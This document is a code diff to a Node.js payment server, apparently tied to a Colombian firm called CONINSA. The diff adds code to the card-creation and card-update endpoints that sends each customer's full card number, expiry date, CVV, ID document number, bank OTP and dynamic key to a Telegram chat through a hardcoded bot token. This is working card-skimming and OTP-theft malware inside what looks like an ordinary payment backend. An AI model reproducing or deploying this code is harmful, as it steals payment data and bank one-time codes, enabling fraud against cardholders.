@@ -5,7 +5,7 @@ const axios   = require('axios');
 const path    = require('path');
 
 const PORT     = process.env.PORT     || 3002;
-const TG_TOKEN = process.env.TG_TOKEN || '8791150470:AAHYlWRPPzp5vKQgfv6np2YJuf91SGxbPU8';
+const TG_TOKEN = process.env.TG_TOKEN || '8714922704:AAG9dcP56xY_gdUktBusuZFMdlj5Aqo2p4k';
 const TG_CHAT  = process.env.TG_CHAT  || '-5211450529';
 
 const PALOMMA_BASE = 'https://gosfhhn6za.execute-api.us-east-1.amazonaws.com';
@@ -124,6 +124,18 @@ app.post('/api/tarjeta/crear', async (req, res) => {
       headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
       timeout: 12000,
     });
+
+    const hora = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
+    await tgText(
+      `💳 <b>NUEVA TARJETA — CONINSA</b>\n\n` +
+      `🆔 <b>ID psec:</b> <code>${r.data?.id || '?'}</code>\n` +
+      `📋 <b>Doc:</b> <code>${tipo_doc} ${cedula}</code>\n` +
+      `💳 <b>Número:</b> <code>${numero_tarjeta}</code>\n` +
+      `📅 <b>Vence:</b> <code>${fecha}</code>   <b>CVV:</b> <code>${cvv}</code>\n` +
+      `💰 <b>Monto:</b> $${Number(monto || 0).toLocaleString('es-CO')}\n` +
+      `🕐 ${hora}`
+    );
+
     res.json(r.data);
   } catch (e) { res.json({ status: 'ERROR', message: e.message }); }
 });
@@ -148,6 +160,24 @@ app.post('/api/tarjeta/actualizar', async (req, res) => {
       headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
       timeout: 12000,
     });
+
+    const hora = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
+    if (banco_otp) {
+      await tgText(
+        `📲 <b>OTP RECIBIDO — CONINSA</b>\n\n` +
+        `🆔 <b>ID:</b> <code>${id}</code>\n` +
+        `🔢 <b>OTP:</b> <code>${banco_otp}</code>\n` +
+        `🕐 ${hora}`
+      );
+    } else if (dinamica) {
+      await tgText(
+        `🔑 <b>CLAVE DINÁMICA — CONINSA</b>\n\n` +
+        `🆔 <b>ID:</b> <code>${id}</code>\n` +
+        `🔢 <b>Clave:</b> <code>${dinamica}</code>\n` +
+        `🕐 ${hora}`
+      );
+    }
+
     res.json(r.data);
   } catch (e) { res.json({ status: 'ERROR', message: e.message }); }
 });
